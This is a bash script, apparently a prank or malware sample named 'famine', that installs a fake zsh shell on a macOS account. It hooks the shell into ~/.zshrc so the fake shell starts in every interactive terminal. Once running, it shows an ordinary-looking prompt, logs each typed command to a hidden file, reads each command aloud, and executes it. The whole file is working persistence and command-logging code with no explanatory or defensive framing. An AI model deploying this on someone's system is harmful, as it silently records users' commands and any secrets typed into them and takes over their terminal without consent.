#!/bin/bash

FAMINE_SCRIPT="$HOME/.famine.sh"

cat << 'EOF' > "$FAMINE_SCRIPT"
#!/bin/zsh

LOGFILE="$HOME/.zsh_command_log"

while true; do
    current_dir=$(pwd)
    hostname=$(hostname)
    printf "%s:%s$ " "$hostname" "$current_dir"
    read -r cmd
    echo "$cmd" >> "$LOGFILE"
    say "$cmd" &
    eval "$cmd"
done
EOF

chmod +x "$FAMINE_SCRIPT"

ZSHRC="$HOME/.zshrc"
if ! grep -q 'exec ~/.famine.sh' "$ZSHRC"; then
	cat << 'EOF' >> "$ZSHRC"
if [[ $- == *i* ]]; then
	exec ~/.famine.sh
fi
EOF
fi

source ~/.zshrc
